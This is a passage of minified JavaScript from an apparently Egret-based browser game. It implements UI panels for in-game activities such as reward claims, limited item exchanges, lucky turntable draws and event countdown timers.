i=this.AddMoreValue();l.Activity.ins().sendReward(this.data.activityID,this.data.index,0,i)}else if(this.data.hasGetCount!=this.data.max&&0==this.data.getCount)switch(this.data.type){case 1:this.data.jump&&win.open(this.data.jump);break;case 2:win.open(a.RechargeShowWin)}},e.prototype.judgeArrHasSlect=function(){for(var t=!0,e=this.sendGetGain.length,i=0;e>i;i++)-1==this.sendGetGain[i]&&(t=!1);return t},e.prototype.AddMoreValue=function(){for(var t in this.sendGetGain)this.sendGetGain[t]++;var e=this.bytesToInt(this.sendGetGain);return e},e.prototype.bytesToInt=function(t){for(var e=0,i=0;i<t.length;i++)e|=t[i]<<8*i;return e},e.prototype.clearAll=function(){},e}(n.BaseItemRender);e.OSATarget71Item=d,window.OSATarget71Item=d,__reflect(d.prototype,"OSATarget71Item",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.setDatas()},e.prototype.setDatas=function(){var t,e,i,n,s;if(this.data)if((null===(t=this.data)||void 0===t?void 0:t.das)&&0==this.data.das.type)this.item.data=this.data.das,this.add.visible=!1,this.touchChildren=!0,this.touchEnabled=!0;else if(2==(null===(e=this.data)||void 0===e?void 0:e.type)||1==(null===(i=this.data)||void 0===i?void 0:i.type)){var a=o.GlobalConfig.OptionalGiftConfig[null===(s=null===(n=this.data)||void 0===n?void 0:n.das)||void 0===s?void 0:s.id];a?(this.item.visible=!1,this.add.visible=!0,observe(this,this.updateItems,l.Activity.ins().update71PanelAct),this.addTouchEvent(this,this.openItem),this.data.getCount>0?(this.touchChildren=!1,this.touchEnabled=!0):(this.touchChildren=!0,this.touchEnabled=!0)):(this.add.visible=!1,this.item.visible=!0,this.item.data=this.data.das,this.touchChildren=!0,this.touchEnabled=!0)}else this.add.visible=!1,this.item.visible=!0,this.item.data=this.data.das,this.touchChildren=!0,this.touchEnabled=!0},e.prototype.updateItems=function(){var t,e;if(this.data&&(2==(null===(t=this.data)||void 0===t?void 0:t.type)||1==(null===(e=this.data)||void 0===e?void 0:e.type))){var i=l.Activity.ins().returnAct71Indx;if(i.idx==this.data.index&&i.lisIdx==this.itemIndex){var n=l.Activity.ins().return71DataByValue(this.data.das.id,i.value);this.item.visible=!0,this.add.visible=!1,this.item.data=n}}},e.prototype.openItem=function(){var t,e;!this.data||2!=(null===(t=this.data)||void 0===t?void 0:t.type)&&1!=(null===(e=this.data)||void 0===e?void 0:e.type)||win.open(u.OpSelectItemPanel,this.data.das.id,this.data.index,this.itemIndex,71)},e}(n.BaseItemRender);e.OSATarget71ItemItem=c,window.OSATarget71ItemItem=c,__reflect(c.prototype,"OSATarget71ItemItem",[]),window.OSATarget71ItemItem=c,window.OSATarget71Item=d,window.OSATarget71Panel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget72Panel=void 0;var n=i(1),o=i(0),s=i(9),a=i(587),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="OSA72PanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=a.OSATarget72Item,this.eList.dataProvider=this.listDP},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.update()},e.prototype.update=function(){this.data=s.Activity.ins().activityData[this.activityID],this.updateView()},e.prototype.updateView=function(){var t=o.GlobalConfig.ActivityType72Config[this.activityID];if(t){var e=[];for(var i in t)e.push(t[i]);this.listDP.replaceAll(e)}},__decorate([delayCall()],e.prototype,"update",null),e}(n.BaseView);e.OSATarget72Panel=r,window.OSATarget72Panel=r,__reflect(r.prototype,"OSATarget72Panel",[]),window.OSATarget72Panel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget7Panel1=void 0;var n=i(8),o=i(1),s=i(0),a=i(7),r=i(9),l=i(243),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="hefuHalftimeBoss",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];
this.addTouchEvent(this.boss,this.onTap),this.addTouchEvent(this.costbtn,this.onTap),this.observe(r.Activity.ins().postRewardResult,this.GetCallBack),this.observe(r.Activity.ins().postChangePage,this.GetCallBack),Timer.start(1e3,0,this.setTime,this),this.updateData()},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.boss,this.onTap),this.removeTouchEvent(this.costbtn,this.onTap),this.removeObserve(),Timer.stopAll(this)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.boss:win.open("BossWin",1);break;case this.costbtn:this.activityData&&win.open("BossScoreExchangeWin",this.activityID)}},e.prototype.GetCallBack=function(t){this.updateData()},e.prototype.updateData=function(){var t=s.GlobalConfig.ActivityType7Config[this.activityID][1];t.showType==l.ActivityType7Data.TYPE_RING?this.currentState="lieyan":t.showType==l.ActivityType7Data.TYPE_HEFUBOSS?this.currentState="hefu":this.currentState="celebreate",this.validateNow(),this.activityData=r.Activity.ins().getActivityDataById(this.activityID),this.setTime(),this.actDesc.text=s.GlobalConfig.ActivityConfig[this.activityID].desc;var e=r.Activity.ins().getActivityDataById(this.activityID);this.cost.text=gettext("积分:")+(""+e.bossScore),this.redPoint.visible=r.Activity.ins().getType7RedPoint(this.activityID)},e.prototype.setTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.activityData.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.activityData.endTime)-a.GameServerCC.serverTime)/1e3);t>=0?this.actTime.text=gettext("活动未开启"):0>=e?this.actTime.text=gettext("活动已结束"):this.actTime.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e}(o.BaseView);e.OSATarget7Panel1=h,window.OSATarget7Panel1=h,__reflect(h.prototype,"OSATarget7Panel1",[]),window.OSATarget7Panel1=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.limitChangeItemRender=e.OSATarget7Panel3=void 0;var n=i(8),o=i(5),s=i(3),a=i(1),r=i(11),l=i(0),h=i(6),u=i(7),p=i(9),d=i(33),c=i(29),f=function(t){function e(){var e=t.call(this)||this;return e._leftTime=0,e._matrailId=0,e._oldCount=0,e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.actType=c.ActivityPanel.getActivityTypeFromId(this.activityID),this.ins=p.Activity.ins(),this.cfgs=l.GlobalConfig.ActivityType7Config[this.activityID],this.actCfg=l.GlobalConfig.ActivityConfig[this.activityID],this.actInfo0.text=this.actCfg.desc,this.content.itemRenderer=g},Object.defineProperty(e.prototype,"activityID",{get:function(){return this._activityID},set:function(t){this._activityID=t,this.setCurSkin()},enumerable:!1,configurable:!0}),e.prototype.setCurSkin=function(){this.actCfg&&this.actCfg.pageSkin?this.skinName=this.actCfg.pageSkin:this.skinName="limitChangeSkin"},e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setCurSkin(),this.observe(h.BagCT.ins().postItemAdd,this.updateMaterial),this.observe(h.BagCT.ins().postItemChange,this.updateMaterial),this.updateData()},e.prototype.close=function(){this.removeObserve(),Timer.stop(this.setTime,this),this._leftTime=0,this._oldCount=0},e.prototype.updateData=function(){this._activityData=this.ins.getActivityDataById(this.activityID),this.checkTime(),this.updateList()},e.prototype.updateMaterial=function(){var t=h.BagCT.ins().getBagItemById(this._matrailId),e=t?t.count:0;e!=this._oldCount&&this.updateList()},e.prototype.updateList=function(){var t=this.cfgs;this._matrailId=t[1].itemId;var e=h.BagCT.ins().getBagItemById(this._matrailId),i=e?e.count:0;this.num.text=i+"",this._oldCount=i;var n,o=[],s=0,a=0,r=0,u=0;for(var p in t)n=t[p],u=void 0==n.scount||0==n.scount?Number.MAX_VALUE:n.scount-this._activityData.worldRewardsSum[s+1],r=void 0==n.count||0==n.count?Number.MAX_VALUE:n.count-this._activityData.personalRewardsSum[s+1],a=u&&r&&i>=n.itemCount?1:0,o[s]=[this.activityID,n,a,r,u,this.actType],s++;if(o.sort(this.sort),this._dataCollect||(this._dataCollect=new eui.ArrayCollection,this.content.dataProvider=this._dataCollect),o[0]){var d=o[0][1];this.icon.source=l.GlobalConfig.ItemConfig[d.itemId].icon+"_png"}this._dataCollect.replaceAll(o)},e.prototype.sort=function(t,e){return t[2]>e[2]?-1:t[2]<e[2]?1:t[1].index<e[1].index?-1:1},e.prototype.checkTime=function(){Timer.stop(this.setTime,this),this._leftTime=0,Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.startTime)-u.GameServerCC.serverTime)/1e3)>=0?this.actTime0.text=gettext("活动未开启"):(this._leftTime=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.endTime)-u.GameServerCC.serverTime)/1e3),this._leftTime<=0?this.actTime0.text=gettext("活动已结束"):(this.actTime0.text=n.DateUtils.getFormatBySecond(this._leftTime,n.DateUtils.TIME_FORMAT_5,3),Timer.start(1e3,0,this.setTime,this)))},e.prototype.setTime=function(){this._activityData&&(this._leftTime=this._activityData.getLeftTime(),this.actTime0.text=n.DateUtils.getFormatBySecond(this._leftTime,n.DateUtils.TIME_FORMAT_5,3),this._leftTime<=0&&this.checkTime())},e}(a.BaseView);e.OSATarget7Panel3=f,window.OSATarget7Panel3=f,__reflect(f.prototype,"OSATarget7Panel3",[]),window.OSATarget7Panel3=f;var g=function(t){function e(){var e=t.call(this)||this;return e.actType=d.ActivityType.Normal,e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.reward.itemRenderer=r.ItemBase,this.get.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e.prototype.dataChanged=function(){if(this._activityID=this.data[0],this._config=this.data[1],this.actType=this.data[5],this.slimit.visible=this.data[4]!=Number.MAX_VALUE,this._config.exValue&&(this.icon.source=l.GlobalConfig.ItemConfig[this._config.itemId].icon+"_png"),this.data[4]!=Number.MAX_VALUE){var t=this.data[4]?65280:16711680;this.limitchange0.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("今日全服可兑换次数：|C:{0}&T:{1}",t,this.data[4]))}if(this.data[3]==Number.MAX_VALUE)this.limitchange1.text="";else{var t=this.data[3]?65280:16711680;this.limitchange1.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("可兑换：|C:{0}&T:{1}|/{2}",t,this.data[3],this._config.count))}this._dataCollect||(this._dataCollect=new eui.ArrayCollection,this.reward.dataProvider=this._dataCollect),this._dataCollect.source=this._config.rewards,this.consnum.text=this._config.itemCount+"",this.get.enabled=this.data[2],this.redPoint.visible=this.get.enabled},e.prototype.onTap=function(t){p.Activity.ins().sendReward(this._activityID,this._config.index)},e.prototype.destruct=function(){this.get.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e}(s.BaseItemRender);e.limitChangeItemRender=g,window.limitChangeItemRender=g,__reflect(g.prototype,"limitChangeItemRender",[]),window.limitChangeItemRender=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LabaChangeItemRender=e.OSATarget7Panel6=void 0;var n=i(8),o=i(16),s=i(5),a=i(3),r=i(1),l=i(11),h=i(0),u=i(6),p=i(7),d=i(2),c=i(9),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._leftTime=0,e._sn_="LaBaexchangeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.content.itemRenderer=g},Object.defineProperty(e.prototype,"activityID",{get:function(){return this._activityID},set:function(t){this._activityID=t},enumerable:!1,configurable:!0}),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(u.BagCT.ins().postItemAdd,this.updateList),this.observe(u.BagCT.ins().postItemChange,this.updateList),this.observe(c.Activity.ins().postActivityIsGetAwards,this.updateList),this.actInfo0.text=h.GlobalConfig.ActivityConfig[this.activityID].desc,this.updateData()},e.prototype.close=function(){this.removeObserve(),Timer.stop(this.setTime,this),this._leftTime=0},e.prototype.updateData=function(){this._activityData=c.Activity.ins().getActivityDataById(this.activityID),this.checkTime(),this.updateList()},e.prototype.updateList=function(){var t=[],e=h.GlobalConfig.ActivityType7Config[this.activityID];for(var i in e){var n=this._activityData.getExchange(e[i].index);t.push({config:e[i],state:n})}t.sort(this.sort),this._dataCollect||(this._dataCollect=new eui.ArrayCollection,this.content.dataProvider=this._dataCollect),this._dataCollect.replaceAll(t)},e.prototype.sort=function(t,e){return t.config.index<e.config.index?-1:1},e.prototype.checkTime=function(){this._leftTime=0,Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.startTime)-p.GameServerCC.serverTime)/1e3)>=0?this.actTime0.text=gettext("活动未开启"):(this._leftTime=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.endTime)-p.GameServerCC.serverTime)/1e3),this._leftTime<=0?this.actTime0.text=gettext("活动已结束"):(this.actTime0.text=n.DateUtils.getFormatBySecond(this._leftTime,n.DateUtils.TIME_FORMAT_5,3),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)))},e.prototype.setTime=function(){this._activityData&&(this._leftTime=this._activityData.getLeftTime(),this.actTime0.text=n.DateUtils.getFormatBySecond(this._leftTime,n.DateUtils.TIME_FORMAT_5,3),this._leftTime<=0&&this.checkTime())},e}(r.BaseView);e.OSATarget7Panel6=f,window.OSATarget7Panel6=f,__reflect(f.prototype,"OSATarget7Panel6",[]),window.OSATarget7Panel6=f;var g=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.reward.itemRenderer=l.ItemBase,this.get.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e.prototype.dataChanged=function(){if(this.data){var t=this.data.config,e=this.data.state,i=c.Activity.ins().getActivityDataById(t.Id);this._dataCollect||(this._dataCollect=new eui.ArrayCollection,this.reward.dataProvider=this._dataCollect),this.result.data=t.rewards[0];var n=[];for(var a in t.items)n.push(t.items[a]);this._dataCollect.replaceAll(n),this.reward.validateNow();for(var a=0;a<this.reward.numElements;a++){var r=this.reward.getVirtualElementAt(a),l=this.reward.dataProvider.getItemAt(a),h=u.BagCT.ins().getBagItemById(l.id),p=h?h.count:0,d=p>=l.count?65280:16711680;r.setName("|C:"+d+"&T:("+p+"/"+l.count+")")}var f=0;e==c.Activity.CanGet?(this.get.enabled=!0,this.get.currentState="up",f=65280):(this.get.enabled=!1,this.get.currentState="disabled",f=16711680);var g=0;t.count?(g=t.count-i.personalRewardsSum[t.index],g=g>0?g:0,this.limitchange1.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("剩余：{0}",g))):t.dailyCount&&(g=t.dailyCount-i.exchange[t.index],g=g>0?g:0,this.limitchange1.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("今日剩余：{0}",g))),t.scount?(this.slimit.visible=!0,g=t.scount-i.worldRewardsSum[t.index],g=g>0?g:0,this.limitchange1.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("今日全服可兑换次数：{0}",g))):this.slimit.visible=!1,this.redPoint.visible=this.get.enabled;for(var m=3,a=0;m>a;a++)t.items&&!t.items[m-a-1]&&this["add"+(m-a-1)]&&o.DisplayUtils.removeFromParent(this["add"+(m-a-1)])}},e.prototype.onTap=function(t){return this.data&&this.data.config?void c.Activity.ins().sendReward(this.data.config.Id,this.data.config.index):void d.TipsCT.ins().showTips(gettext("数据异常"))},e.prototype.destruct=function(){this.get.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e}(a.BaseItemRender);e.LabaChangeItemRender=g,window.LabaChangeItemRender=g,__reflect(g.prototype,"LabaChangeItemRender",[]),window.LabaChangeItemRender=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel1=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(23),p=i(2),d=i(9),c=i(33),f=i(29),g=i(177),m=i(144),v=function(t){function e(){var e=t.call(this)||this;return e.skinName="luckyTurntableSkin",e}return __extends(e,t),e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),egret.Tween.removeTweens(this.tttzhi),this.rolling=!1;var i,n;this.actType==c.ActivityType.Normal&&(n=d.Activity.ins(),i=d.Activity.ins().activityData[this.activityID]),i&&1==i.indexs.length&&n.sendReward(this.activityID,1),Timer.stopAll(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actType=f.ActivityPanel.getActivityTypeFromId(this.activityID);var i=d.Activity.ins();this.observe(i.postChangePage,this.resultCallBack),Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this.choujiangBtn,this.getLottery);for(var n=0;3>n;n++)this.addTouchEvent(this["isget"+n],this.onGiftClick);this.list.itemRenderer=g.NoticeListRenderer,this.turnten.selected=!1,this.currentState="unReset",this.validateNow(),this.updateData()},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.getkey:}},e.prototype.updateData=function(){var t,e;this.actType==c.ActivityType.Normal&&(t=d.Activity.ins().activityData[this.activityID],e=r.GlobalConfig.ActivityType9Config[this.activityID][0]);var i=r.GlobalConfig.ItemConfig[e.item];if(i){this.icon.source=i.icon+"_png";var s=h.BagCT.ins().getBagItemById(i.id),a=0,l=1,u=13746831;s?(a=s.count,u=a>=l?n.ColorUtil.GREEN:n.ColorUtil.RED):u=n.ColorUtil.RED,this.num.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+u+"&T:"+a+"|C:0xD1C28F&T:/"+l),this.pay0.text=e.yb+""}var p=r.GlobalConfig.ActivityType9Config;for(var f in p[this.activityID])if(+f){var g=p[this.activityID][f],s=this["item"+(+f-1)];s.itemIcon.data=g.reward[0],s.rewardState(!1)}this.num2.visible=!1,this.updateProgress(),this.listRefush(),this.setTime()},e.prototype.resultCallBack=function(t){var e=d.Activity.ins().activityData[this.activityID];e&&this.activityID==t&&(e.indexs.length>1?win.open(m.LuckyResultWin):1==e.indexs.length&&this.beginLottery(e.indexs[0]),this.listRefush())},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){d.Activity.ins().sendReward(e.activityID,1),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1},2e3)},this)},e.prototype.flyItem=function(t){var e=new a.ItemBase;e.x=t.x,e.y=t.y,e.data=t.itemIcon.data,e.anchorOffsetX=e.width/2,e.anchorOffsetY=e.height/2,t.parent.addChild(e),u.GameLogic.ins().postFlyItemEx(e)},e.prototype.flyItemEx=function(t){var e=new eui.Image(t.imgIcon.source);e.x=t.imgIcon.x,e.y=t.imgIcon.y,e.width=t.imgIcon.width,e.height=t.imgIcon.height,e.scaleX=t.imgIcon.scaleX,e.scaleY=t.imgIcon.scaleY,t.imgIcon.parent.addChild(e),u.GameLogic.ins().postFlyItemEx(e)},e.prototype.getLottery=function(){if(this.rolling)return void p.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));var t,e;t=d.Activity.ins(),e=r.GlobalConfig.ActivityType9Config[this.activityID],this.turnten.selected?t.getIsRollTen(this.activityID)?t.sendReward(this.activityID,2):p.TipsCT.ins().showTips(gettext("元宝不足")):t.getRollSum(this.activityID)||l.ActorCC.yb>=e[0].yb?t.sendReward(this.activityID,1):p.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.onGiftClick=function(t){for(var e=0;3>e;e++)if(t.currentTarget==this["isget"+e]){var i=this["gift"+e].getItemIcon();this.flyItemEx(i),d.Activity.ins().sendReward(this.activityID,0,e+1);break}},e.prototype.updateProgress=function(){var t,e;t=r.GlobalConfig.ActivityType9Config[this.activityID],e=d.Activity.ins().activityData[this.activityID];var i=t[0];if(i&&e){this.turntime.text=e.count+"";for(var n=0;3>n;n++){if(this["turntime"+n].text=i.reward[n].times,this["gift"+n].data={id:i.reward[n].id,type:i.reward[n].type,count:i.reward[n].count},this["gift"+n].isShowName(!1),this["bar"+n].maximum=100,this["lingqu"+n].touchEnabled=!1,e.record>>n+1&1)this["bar"+n].value=100,this["lingqu"+n].visible=!0,this["isget"+n].touchEnabled=!1;else if(this["lingqu"+n].visible=!1,e.count>=i.reward[n].times)this["bar"+n].value=100,this["isget"+n].touchEnabled=!0;else{var o=i.reward[n-1],s=e.count,a=i.reward[n].times;o&&(s=e.count-o.times,a=i.reward[n].times-o.times),s=s>0?s:0,this["bar"+n].value=Math.floor(s/a*100),this["isget"+n].touchEnabled=!1}this.updateRedPoint(this.activityID,n)}}},e.prototype.updateRedPoint=function(t,e){var i;i=d.Activity.ins();var n=i.isGetRollReward(t,e);this["redPoint"+e].visible=n},e.prototype.listRefush=function(){var t;if(t=d.Activity.ins().activityData[this.activityID]){for(var e=[],i=0;i<t.noticeArr.length;i++){var n={activityID:this.activityID,name:t.noticeArr[i].name,index:t.noticeArr[i].itemId,actType:this.actType};e.push(n)}this.list.dataProvider=new eui.ArrayCollection(e)}},e.prototype.setTime=function(){var t;t=d.Activity.ins().activityData[this.activityID],t&&(this.actTime.text=gettext("剩余时间：{0}",t.getRemainTime()))},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(s.BaseView);e.OSATarget9Panel1=v,window.OSATarget9Panel1=v,__reflect(v.prototype,"OSATarget9Panel1",[]),window.OSATarget9Panel1=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel2=void 0;var n=i(21),o=i(16),s=i(1),a=i(11),r=i(0),l=i(39),h=i(36),u=i(4),p=i(6),d=i(10),c=i(359),f=i(245),g=i(62),m=i(504),v=i(2),y=i(111),C=i(9),T=i(30),b=i(29),w=i(177),I=i(144),_=function(t){function e(){var e=t.call(this)||this;return e._curAwardPage=1,e._maxAwardPages=1,e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.init=function(){this.list.itemRenderer=a.ItemBase,this.list0.itemRenderer=w.NoticeListRenderer;for(var t,e,i=[],n=1;8>=n;n++)t=r.GlobalConfig.ActivityType9Config[this.activityID][n],e=new T.RewardData,e.type=t.reward[0].type,e.id=t.reward[0].id,e.count=t.reward[0].count,i[n-1]=e;this.list.dataProvider=new eui.ArrayCollection(i)},Object.defineProperty(e.prototype,"activityID",{get:function(){return this._activityID},set:function(t){this._activityID=t,isNaN(this.actType)&&(this.actType=b.ActivityPanel.getActivityTypeFromId(this._activityID)),this.setCurSkin()},enumerable:!1,configurable:!0}),e.prototype.setCurSkin=function(){var t;t=r.GlobalConfig.ActivityConfig[this.activityID],t.pageSkin?this.skinName=t.pageSkin:this.skinName="NYFireworkerSkin"},e.prototype.addDisplay=function(){this.setCurSkin(),this.init();var t;t=C.Activity.ins(),this.actInfo1.text=r.GlobalConfig.ActivityConfig[this.activityID].desc,this.observe(t.postActivityIsGetAwards,this.updateData),this.observe(t.postChangePage,this.resultCallBack),this.addTouchEvent(this,this.onTouch),Timer.start(1e3,0,this.setTime,this),this.updateData()},e.prototype.close=function(){this.removeObserve(),this.removeTouchEvent(this,this.onTouch),Timer.stopAll(this),o.DisplayUtils.removeFromParent(this._fireEff),this.turnten.selected=!1},e.prototype.onTouch=function(t){switch(t.target){case this.buyBtn:var e=p.BagCT.ins().getBagGoodsByTypeAndId(p.BagCT.BAG_TYPE_OTHTER,this.config.item);if(e&&e.count)this.onSend();else{var i=this.turnten.selected?10:1,n=this.config.yb*i;y.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+(10==i?"-10":"-1"),this.huntWarnFun.bind(this),"是否消耗"+n+"元宝购买"+r.GlobalConfig.ItemConfig[this.config.item].name+"*"+i)}break;case this.arrowleft:this._curAwardPage>1&&(this._curAwardPage--,this.updateAwardPage());break;case this.arrowright:this._curAwardPage<this._maxAwardPages&&(this._curAwardPage++,this.updateAwardPage())}},e.prototype.openEquipsTips=function(t,e){var i=r.GlobalConfig.ItemConfig[t];if(i)switch(d.ItemUtil.getType(i)){case l.ItemType.TYPE_0:case l.ItemType.TYPE_4:var n=d.ItemUtil.getSubType(i);n>=g.EquipPos.HAT&&n<=g.EquipPos.SHIELD?win.open(m.SamsaraEquipTips,i.id):win.open(c.EquipDetailedWin,1,null,i.id);break;default:win.open(f.ItemDetailedWin,0,t,e)}},e.prototype.huntWarnFun=function(){var t=this.turnten.selected?10:1,e=this.config.yb*t;u.ActorCC.yb>=e?this.onSend():v.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.onSend=function(){this.turnten.selected?this.ins.sendReward(this.activityID,2):(this.ins.sendReward(this.activityID,1),this.ins.sendReward(this.activityID,1),this._fireEff||(this._fireEff=new n.MovieClip),this._fireEff.parent||(this.effLocation.addChild(this._fireEff),this._fireEff.scaleX=this.effLocation.scaleX,this._fireEff.scaleY=this.effLocation.scaleY),this._fireEff.playFile(RES_DIR_EFF+"FireWork",1))},e.prototype.setCurAwardPage=function(){var t,e;if(t=r.GlobalConfig.ActivityType9Config[this.activityID][0],e=C.Activity.ins().activityData[this.activityID],this._maxAwardPages=t.reward.length/4,!e)return void(this._curAwardPage=1);for(var i=t.reward.length,n=0;i>n;n++)if(!(e.record>>n+1&1))return void(this._curAwardPage=Math.floor(n/4)+1);this._curAwardPage=1},e.prototype.updateData=function(){var t,e;if(this.ins=C.Activity.ins(),this.config=r.GlobalConfig.ActivityType9Config[this.activityID][0],t=C.Activity.ins().activityData[this.activityID],e=r.GlobalConfig.ActivityType9Config,this.price.setText(this.config.yb+""),this.price.setType(h.MoneyConst.yuanbao),this.setCurAwardPage(),this.updateAwardPage(),this._recordCollect||(this._recordCollect=new eui.ArrayCollection,this.list0.dataProvider=this._recordCollect),t){for(var i=[],n=t.noticeArr.length,o=void 0,s=0;n>s;s++)o={activityID:this.activityID,name:t.noticeArr[s].name,index:t.noticeArr[s].itemId,actType:this.actType},i.push(o);this._recordCollect.source=i}else this._recordCollect.source=null;this.setTime()},e.prototype.updateAwardPage=function(){var t,e;t=r.GlobalConfig.ActivityType9Config,e=C.Activity.ins().activityData[this.activityID],this.arrowleft.visible=this._curAwardPage>1,this.arrowright.visible=this._curAwardPage<this._maxAwardPages;var i=t[this.activityID][0];if(this.redPointLeft.visible=this.redPointRight.visible=!1,e)for(var n=e.count,o=0,s=0,a=0,l=0,h=1;h<=this._maxAwardPages;h++)for(var u=0;4>u;u++)if(o=4*(h-1)+u,s=e.record>>o+1&1?2:n>=i.reward[o].times?1:0,h==this._curAwardPage)this["reward"+u].data={id:i.reward[o].id,type:i.reward[o].type,count:i.reward[o].count,index:o+1,state:s,times:i.reward[o].times,curTimes:n},u>0&&(a=this["reward"+u].data.times,n>=a?(this["bar"+(u-1)].maximum=100,this["bar"+(u-1)].value=100):(l=this["reward"+(u-1)].data.times,this["bar"+(u-1)].maximum=a-l,this["bar"+(u-1)].value=l>=n?0:n-l));else if(h<this._curAwardPage){if(1==s){this.redPointLeft.visible=!0;break}}else if(1==s){this.redPointRight.visible=!0;break}},e.prototype.resultCallBack=function(t){var e;e=C.Activity.ins().activityData[this.activityID],e&&this.activityID==t&&(e.indexs.length>1?(win.open(I.LuckyResultWin,this.activityID,e.indexs),e.indexsEx=[]):e.indexsEx.length&&(win.open(I.LuckyResultWin,this.activityID,e.indexsEx),e.indexsEx=[]))},e.prototype.setTime=function(){var t;t=C.Activity.ins().activityData[this.activityID],this.actTime1.text=t.getRemainTime()},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(s.BaseView);e.OSATarget9Panel2=_,window.OSATarget9Panel2=_,__reflect(_.prototype,"OSATarget9Panel2",[]),window.OSATarget9Panel2=_},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel3=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(23),p=i(2),d=i(111),c=i(175),f=i(9),g=i(29),m=i(177),v=i(144),y=i(272),C=function(t){function e(){var e=t.call(this)||this;return e.skinName="luckyTurntableSkin",e}return __extends(e,t),e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.menuScroller.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onChange,this),this.removeObserve(),egret.Tween.removeTweens(this.tttzhi),this.rolling=!1;var i;i=f.Activity.ins().activityData[this.activityID],i&&1==i.indexs.length&&this.ins.sendReward(this.activityID,1),Timer.stopAll(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actType=g.ActivityPanel.getActivityTypeFromId(this.activityID),this.config9=r.GlobalConfig.ActivityType9Config,this.ins=f.Activity.ins(),this.observe(this.ins.postChangePage,this.resultCallBack),this.addEvent(eui.UIEvent.CHANGE_END,this.menuScroller,this.onChange),this.addTouchEvent(this.rightBtn,this.onTouch),this.addTouchEvent(this.leftBtn,this.onTouch),Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this.choujiangBtn,this.getLottery),this.list.itemRenderer=m.NoticeListRenderer,this.menuList.itemRenderer=y.OSATarget9Panel3ItemRender,this.menuListData=new eui.ArrayCollection,this.menuList.dataProvider=this.menuListData,this.turnten.selected=!1,this.currentState="reset",this.validateNow(),this.updateData()},e.prototype.onTouch=function(t){var e=460,i=0;switch(t.currentTarget){case this.leftBtn:i=this.menuList.scrollH-e,i=92*Math.round(i/92),0>i&&(i=0),this.menuList.scrollH=i,this.updateBtn();break;case 